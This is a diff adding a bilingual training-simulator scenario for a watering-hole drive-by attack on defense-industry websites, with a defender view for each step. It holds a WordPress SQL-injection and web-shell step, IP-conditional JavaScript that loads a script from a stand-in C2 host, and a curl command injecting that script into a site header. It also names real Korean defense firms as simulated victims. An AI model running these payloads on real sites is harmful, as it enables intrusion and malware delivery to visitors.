@@ -1,0 +1,173 @@
+{
+  "id": "T1608.004",
+  "title": "Drive-by 타겟 시뮬레이션",
+  "titleEn": "Drive-by Target Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 타겟 정찰", "labelEn": "🔍 Target Recon", "steps": [0, 1] },
+    { "label": "⚡ 워터링홀 구성", "labelEn": "⚡ Watering Hole Setup", "steps": [2, 3] },
+    { "label": "✅ 감염 테스트", "labelEn": "✅ Infection Test", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "ext", "label": "Attacker", "x": 50, "y": 60 },
+    { "id": "recon", "label": "Target Recon", "x": 180, "y": 30 },
+    { "id": "victim-site", "label": "Victim Website", "x": 320, "y": 30 },
+    { "id": "ek", "label": "Exploit Kit", "x": 320, "y": 90 },
+    { "id": "victim", "label": "Target User", "x": 500, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "ext", "to": "recon", "minStep": 0 },
+    { "from": "recon", "to": "victim-site", "minStep": 1 },
+    { "from": "ext", "to": "ek", "minStep": 2 },
+    { "from": "victim-site", "to": "ek", "minStep": 3 },
+    { "from": "victim", "to": "victim-site", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "watering_hole.py", "icon": "🐍", "alert": true },
+    { "name": "inject.js", "icon": "📜", "alert": true },
+    { "name": "exploit_kit", "icon": "🌐" }
+  ],
+  "steps": [
+    {
+      "cmd": "python3 watering_hole_recon.py --industry \"defense\" --region \"KR\" --output targets.json",
+      "out": "[*] Analyzing defense industry browsing patterns...\n[*] Data sources: LinkedIn profiles, conference registrations, DNS analytics\n\n[+] Top watering hole candidates:\n  [1] aerospace-conference[.]org    — 12,400 monthly visits — WordPress 5.8.2\n      Known visitors from: KAI, Hanwha, LIG Nex1\n  [2] defense-journal[.]co[.]kr     — 8,200 monthly visits — Drupal 9.3\n  [3] military-tech-expo[.]com      — 5,100 monthly visits — Custom PHP\n\n[+] Vulnerability scan results:\n  aerospace-conference[.]org:\n    - CVE-2022-21661: WordPress SQL Injection (CRITICAL)\n    - jQuery 1.12.4 (outdated, XSS vulnerable)\n    - xmlrpc.php exposed\n    - wp-login.php brute-forceable\n\n[+] Target selected: aerospace-conference[.]org\n[+] Results saved to targets.json",
+      "def": "[Threat Intel] Reconnaissance activity detected — defense industry targeting patterns observed",
+      "defAction": "Source: Multiple OSINT platforms\nTarget: Defense industry websites\nAction: Increased monitoring on defense-related web assets, threat advisory issued",
+      "desc": "방위산업 종사자가 자주 방문하는 웹사이트를 정찰하여 워터링홀 타겟을 선정합니다.",
+      "descEn": "Reconnaissance of websites frequented by defense industry workers to select watering hole targets.",
+      "stepTitle": "워터링홀 타겟 정찰",
+      "stepTitleEn": "Watering Hole Target Recon",
+      "feynman": "사자가 물웅덩이에서 사냥하는 것과 같습니다. 사냥감이 반드시 물을 마시러 오듯이, 방위산업 종사자들이 반드시 방문하는 업계 사이트를 찾습니다. 그중 보안이 취약한 사이트를 골라 함정을 준비합니다.",
+      "feynmanEn": "Like a lion hunting at a watering hole. Just as prey must come to drink, defense industry workers must visit industry sites. The attacker finds the most vulnerable site among those to set a trap.",
+      "expert": "LinkedIn 프로필 분석, 콘퍼런스 등록 페이지, Alexa/SimilarWeb 데이터를 결합하면 타겟 업계의 브라우징 패턴을 정확히 파악할 수 있습니다.",
+      "expertEn": "Combining LinkedIn profile analysis, conference registration pages, and Alexa/SimilarWeb data accurately maps target industry browsing patterns.",
+      "defTooltip": "🔗 위협 인텔: 방위산업 대상 정찰 활동 탐지",
+      "defTooltipEn": "🔗 Threat Intel: Defense industry targeting reconnaissance detected",
+      "hackerLog": {
+        "title": "watering_hole_recon.log",
+        "lines": [
+          { "log": "Target industry: Defense (KR)", "desc": "💡 한국 방위산업 종사자 타겟팅" },
+          { "log": "Selected: aerospace-conference[.]org", "desc": "💡 WordPress 취약점 있는 업계 사이트 선택" },
+          { "log": "Monthly visitors: 12,400", "desc": "💡 충분한 방문자 — 감염 확률 극대화" }
+        ]
+      },
+      "terms": [
+        { "name": "워터링홀", "desc": "Watering Hole. 타겟이 자주 방문하는 웹사이트를 해킹하여 대기하는 공격 기법." },
+        { "name": "XSS", "desc": "Cross-Site Scripting. 웹 페이지에 악성 스크립트를 삽입하는 공격." }
+      ]
+    },
+    {
+      "cmd": "python3 wp_exploit.py --target aerospace-conference[.]org --cve CVE-2022-21661 --payload webshell.php",
+      "out": "[*] Exploiting WordPress SQL Injection (CVE-2022-21661)...\n[*] Target: https://aerospace-conference[.]org\n\n[+] SQL Injection successful — extracting wp_users...\n    admin:$P$B8bN1z9Y.../  (bcrypt hash)\n\n[*] Cracking admin password...\n[+] Password cracked: Conference2023!\n\n[*] Logging into WordPress admin panel...\n[+] Login successful — /wp-admin/ accessible\n\n[*] Uploading web shell via Theme Editor...\n[+] Web shell deployed: /wp-content/themes/flavor/404.php\n[+] Access: https://aerospace-conference[.]org/wp-content/themes/flavor/404.php?cmd=id\n[+] Response: uid=33(www-data) gid=33(www-data)\n\n[+] Full web server access achieved",
+      "def": "[WAF] SQL Injection attempt blocked on aerospace-conference[.]org — CVE-2022-21661 pattern",
+      "defAction": "Source: Web Application Firewall\nTarget: aerospace-conference[.]org/wp-admin/\nAction: Request blocked, IP banned, admin notified for WordPress update",
+      "desc": "WordPress 취약점을 이용하여 타겟 웹사이트의 관리자 권한을 탈취합니다.",
+      "descEn": "Exploiting WordPress vulnerability to gain admin access to target website.",
+      "stepTitle": "웹사이트 침투",
+      "stepTitleEn": "Website Compromise",
+      "feynman": "물웅덩이에 독을 타는 준비 단계입니다. WordPress의 SQL 인젝션 취약점으로 관리자 비밀번호를 추출하고, 테마 편집기를 통해 웹셸을 업로드합니다. 이제 사이트의 모든 페이지를 수정할 수 있습니다.",
+      "feynmanEn": "Like preparing to poison the watering hole. Using WordPress SQL injection vulnerability to extract admin password, then uploading a web shell via theme editor. Now all pages on the site can be modified.",
+      "expert": "CVE-2022-21661은 WP_Query의 terms 파라미터에서 발생하는 SQL 인젝션입니다. 웹셸을 404.php에 숨기면 정상 404 에러와 구분이 어렵습니다.",
+      "expertEn": "CVE-2022-21661 is a SQL injection in WP_Query terms parameter. Hiding the web shell in 404.php makes it hard to distinguish from normal 404 errors.",
+      "defTooltip": "🔗 WAF: SQL 인젝션 패턴 차단 — WordPress CVE-2022-21661",
+      "defTooltipEn": "🔗 WAF: SQL Injection pattern blocked — WordPress CVE-2022-21661",
+      "hackerLog": {
+        "title": "wp_exploit.log",
+        "lines": [
+          { "log": "CVE: CVE-2022-21661 (SQLi)", "desc": "💡 WordPress SQL 인젝션 취약점 악용" },
+          { "log": "Admin access: Conference2023!", "desc": "💡 관리자 비밀번호 크래킹 성공" },
+          { "log": "Webshell: /themes/flavor/404.php", "desc": "💡 404 페이지에 웹셸 은닉" }
+        ]
+      },
+      "terms": [
+        { "name": "SQL Injection", "desc": "데이터베이스 쿼리에 악성 SQL 구문을 삽입하여 정보를 추출하거나 조작하는 공격." },
+        { "name": "Web Shell", "desc": "웹 서버에 업로드된 악성 스크립트로, 원격에서 서버 명령을 실행할 수 있게 합니다." }
+      ]
+    },
+    {
+      "cmd": "cat > /tmp/inject.js << 'JS'\n(function(){\n  var c2='https://cdn-update[.]com';\n  var targets=['203.0.113.0/24','198.51.100.0/24'];\n  fetch('https://api.ipify.org?format=json')\n    .then(r=>r.json())\n    .then(d=>{\n      if(matchCIDR(d.ip,targets)){\n        var s=document.createElement('script');\n        s.src=c2+'/gate.js?v='+Date.now();\n        document.head.appendChild(s);\n      }\n    }).catch(()=>{});\n})();\nJS\npython3 js_obfuscator.py /tmp/inject.js --output /tmp/inject_obf.js && echo '[+] Obfuscated payload ready'",
+      "out": "[*] JavaScript obfuscation settings:\n    - Variable renaming: enabled\n    - String encoding: hex + Base64\n    - Control flow flattening: enabled\n    - Dead code injection: enabled\n    - Self-defending: enabled\n\n[+] Original size: 482 bytes\n[+] Obfuscated size: 3,847 bytes\n[+] Obfuscation ratio: 7.98x\n\n[+] Anti-analysis features:\n    - DevTools detection (debugger trap)\n    - VM/Sandbox evasion (canvas fingerprint)\n    - Bot detection (mouse movement check)\n\n[+] Obfuscated payload ready\n[+] Output: /tmp/inject_obf.js",
+      "def": "[Sandbox] Suspicious JavaScript detected — IP-based conditional execution with external script loading",
+      "defAction": "Source: JavaScript analysis sandbox\nTarget: inject_obf.js\nAction: Script flagged for IP-conditional execution, CDN domain added to blocklist",
+      "desc": "IP 대역 기반 조건부 실행 + 난독화된 JavaScript 페이로드를 준비합니다.",
+      "descEn": "Preparing IP-range conditional execution JavaScript payload with obfuscation.",
+      "stepTitle": "악성 JavaScript 페이로드 제작",
+      "stepTitleEn": "Malicious JavaScript Payload Creation",
+      "feynman": "물웅덩이에 넣을 특수한 독을 만드는 것입니다. 이 독은 방위산업 IP 대역에서 온 동물(사용자)만 감염시킵니다. 일반 방문자는 아무것도 느끼지 못합니다. 독은 암호화되어 있어서 수질검사(보안 분석)로도 쉽게 발견되지 않습니다.",
+      "feynmanEn": "Like creating a special poison for the watering hole that only affects animals (users) from defense industry IP ranges. Regular visitors notice nothing. The poison is encrypted so water testing (security analysis) doesn't easily detect it.",
+      "expert": "Control Flow Flattening과 Dead Code Injection은 정적 분석을 어렵게 만듭니다. DevTools 탐지(debugger 트랩)와 Canvas Fingerprinting 기반 VM/샌드박스 우회는 동적 분석도 방해합니다.",
+      "expertEn": "Control Flow Flattening and Dead Code Injection hinder static analysis. DevTools detection (debugger traps) and Canvas Fingerprinting-based VM/sandbox evasion also impede dynamic analysis.",
+      "defTooltip": "🔗 샌드박스: IP 조건부 실행 + 외부 스크립트 로딩 탐지",
+      "defTooltipEn": "🔗 Sandbox: IP-conditional execution + external script loading detected",
+      "hackerLog": {
+        "title": "payload_prep.log",
+        "lines": [
+          { "log": "Target IPs: 203.0.113.0/24, 198.51.100.0/24", "desc": "💡 방위산업 IP 대역만 타겟팅" },
+          { "log": "Obfuscation: 7.98x (482→3847 bytes)", "desc": "💡 난독화로 탐지 회피" },
+          { "log": "Anti-analysis: DevTools + VM evasion", "desc": "💡 분석 환경 자동 감지 및 회피" }
+        ]
+      },
+      "terms": [
+        { "name": "난독화", "desc": "Obfuscation. 코드의 로직을 유지하면서 읽기 어렵게 변환하는 기법. 보안 분석을 방해합니다." },
+        { "name": "Control Flow Flattening", "desc": "코드 실행 흐름을 평탄화하여 switch-case 구조로 변환, 분석을 어렵게 만드는 난독화 기법." }
+      ]
+    },
+    {
+      "cmd": "# 해킹된 WordPress 사이트에 악성 스크립트 주입\ncurl -s -X POST 'https://aerospace-conference[.]org/wp-content/themes/flavor/404.php' \\\n  -d 'cmd=echo \"<script src=https://cdn-static-assets[.]com/analytics.min.js></script>\" >> /var/www/html/wp-content/themes/flavor/header.php' \\\n  && echo '[+] Payload injected into theme header'",
+      "out": "[+] Payload injected into theme header\n\n[*] Verifying injection...\n$ curl -s https://aerospace-conference[.]org/ | grep cdn-static-assets\n<script src=https://cdn-static-assets[.]com/analytics.min.js></script>\n\n[+] Injection confirmed — script loads on ALL pages\n\n[*] Testing conditional execution...\n  From non-target IP (45.33.x.x): No payload delivered ✓\n  From target IP (203.0.113.x):   Exploit Kit redirect triggered ✓\n\n[*] Exploit Kit (RIG EK) configuration:\n  Gate URL: https://cdn-update[.]com/gate.php\n  Landing: Browser fingerprint → CVE-2024-XXXX (Chrome V8)\n  Payload: Cobalt Strike Beacon (stageless, HTTPS)\n\n[+] Watering hole fully operational",
+      "def": "[IDS] New external script tag injected in aerospace-conference[.]org header — cdn-static-assets[.]com not in baseline",
+      "defAction": "Source: Website Integrity Monitor\nTarget: aerospace-conference[.]org/wp-content/themes/flavor/header.php\nAction: File change detected, alert triggered, domain cdn-static-assets[.]com flagged for analysis",
+      "desc": "해킹된 웹사이트의 모든 페이지에 악성 스크립트를 주입합니다.",
+      "descEn": "Injecting malicious script into all pages of the compromised website.",
+      "stepTitle": "워터링홀 페이로드 주입",
+      "stepTitleEn": "Watering Hole Payload Injection",
+      "feynman": "물웅덩이에 독을 투입하는 최종 단계입니다. 사이트의 모든 페이지에 공통으로 로드되는 header.php에 악성 스크립트를 삽입합니다. analytics.min.js라는 이름으로 위장하여 구글 애널리틱스처럼 보이게 합니다.",
+      "feynmanEn": "The final step of poisoning the watering hole. Injecting malicious script into header.php that loads on every page, disguised as analytics.min.js to look like Google Analytics.",
+      "expert": "header.php 주입은 WordPress 테마의 모든 페이지에 적용됩니다. CDN 도메인을 cdn-static-assets[.]com으로 명명하면 정상 CDN과 구분이 어렵습니다. SRI(Subresource Integrity) 미적용 사이트에서만 동작합니다.",
+      "expertEn": "Header.php injection applies to all WordPress theme pages. Naming CDN domain cdn-static-assets[.]com makes it hard to distinguish from legitimate CDNs. Only works on sites without SRI (Subresource Integrity).",
+      "defTooltip": "🔗 IDS: 베이스라인에 없는 외부 스크립트 태그 삽입 탐지",
+      "defTooltipEn": "🔗 IDS: External script tag not in baseline injected into header",
+      "hackerLog": {
+        "title": "injection.log",
+        "lines": [
+          { "log": "Injected: header.php (all pages)", "desc": "💡 모든 페이지에서 악성 스크립트 로드" },
+          { "log": "Disguise: analytics.min.js", "desc": "💡 정상 분석 도구로 위장" },
+          { "log": "EK: RIG → CVE-2024-XXXX → CS Beacon", "desc": "💡 Exploit Kit → 브라우저 취약점 → Cobalt Strike" }
+        ]
+      },
+      "terms": [
+        { "name": "Exploit Kit", "desc": "여러 브라우저/플러그인 취약점을 자동으로 시도하여 방문자를 감염시키는 자동화 도구." },
+        { "name": "SRI", "desc": "Subresource Integrity. 외부 스크립트의 해시를 검증하여 변조된 스크립트 실행을 방지하는 보안 메커니즘." }
+      ]
+    },
+    {
+      "cmd": "python3 watering_hole_monitor.py --site aerospace-conference[.]org --duration 7d --report",
+      "out": "[*] Monitoring watering hole: aerospace-conference[.]org\n[*] Campaign duration: 7 days (2026-02-22 ~ 2026-03-01)\n\n═══════════════════════════════════════════════\n  WATERING HOLE CAMPAIGN RESULTS\n═══════════════════════════════════════════════\n\n  Total site visitors:     8,412\n  Visitors from target IPs:  347  (4.1%)\n  Exploit Kit redirected:    347  (100% of targets)\n  Browser exploitable:       128  (36.9% of targets)\n  Payload delivered:         128  (CS Beacon installed)\n  Beacon callback:           119  (93.0% success rate)\n\n  Infected organizations:\n    ├── KAI (Korea Aerospace): 41 endpoints\n    ├── Hanwha Defense:        33 endpoints\n    ├── LIG Nex1:              28 endpoints\n    └── Other defense:         17 endpoints\n\n  Zero detections by AV/EDR:   119/119 (100%)\n  Average dwell time:          0 seconds (drive-by)\n\n[+] Campaign status: ACTIVE\n[!] WARNING: This is a simulation for educational purposes only",
+      "def": "[SOC] Multiple endpoints connecting to cdn-update[.]com after visiting aerospace-conference[.]org — possible watering hole attack",
+      "defAction": "Source: SIEM correlation\nTarget: 119 defense industry endpoints\nAction: IR team activated, aerospace-conference[.]org blocked, affected endpoints isolated for forensics",
+      "desc": "워터링홀 캠페인 결과를 모니터링하고 감염 현황을 확인합니다.",
+      "descEn": "Monitoring watering hole campaign results and checking infection status.",
+      "stepTitle": "캠페인 결과 확인",
+      "stepTitleEn": "Campaign Results Review",
+      "feynman": "물웅덩이에 설치한 카메라로 사냥 결과를 확인하는 것입니다. 7일 동안 8,412명이 사이트를 방문했고, 그중 347명이 타겟 IP에서 접속했습니다. 브라우저 취약점이 있던 128명에게 Cobalt Strike가 설치되었고, 119명이 실제로 콜백에 성공했습니다.",
+      "feynmanEn": "Like reviewing camera footage at the watering hole. Over 7 days, 8,412 visitors came, 347 from target IPs. Cobalt Strike was installed on 128 with vulnerable browsers, and 119 successfully called back.",
+      "expert": "36.9%의 브라우저 익스플로잇 성공률은 최신 브라우저 패치 미적용을 반영합니다. 0초 체류시간(dwell time)은 Drive-by 특성상 사용자 인터랙션이 불필요함을 나타냅니다. SIEM 상관분석으로 다수 엔드포인트의 동일 C2 접속을 탐지할 수 있습니다.",
+      "expertEn": "36.9% browser exploit success rate reflects unpatched browsers. Zero dwell time reflects the drive-by nature requiring no user interaction. SIEM correlation can detect multiple endpoints connecting to the same C2.",
+      "defTooltip": "🔗 SOC: 다수 엔드포인트 동일 C2 접속 — 워터링홀 공격 가능성",
+      "defTooltipEn": "🔗 SOC: Multiple endpoints connecting to same C2 — possible watering hole attack",
+      "hackerLog": {
+        "title": "campaign_results.log",
+        "lines": [
+          { "log": "Visitors: 8,412 → Targets: 347 (4.1%)", "desc": "💡 전체 방문자 중 타겟 비율" },
+          { "log": "Exploited: 128 → Callback: 119 (93%)", "desc": "💡 높은 감염 성공률" },
+          { "log": "Orgs: KAI(41) + Hanwha(33) + LIG(28)", "desc": "💡 주요 방위산업체 다수 감염" }
+        ]
+      },
+      "terms": [
+        { "name": "Drive-by Download", "desc": "사용자의 능동적 행동 없이 웹 페이지 방문만으로 악성코드가 다운로드/실행되는 공격." },
+        { "name": "SIEM", "desc": "Security Information and Event Management. 보안 이벤트를 수집/상관분석하여 위협을 탐지하는 시스템." }
+      ]
+    }
+  ]
+}
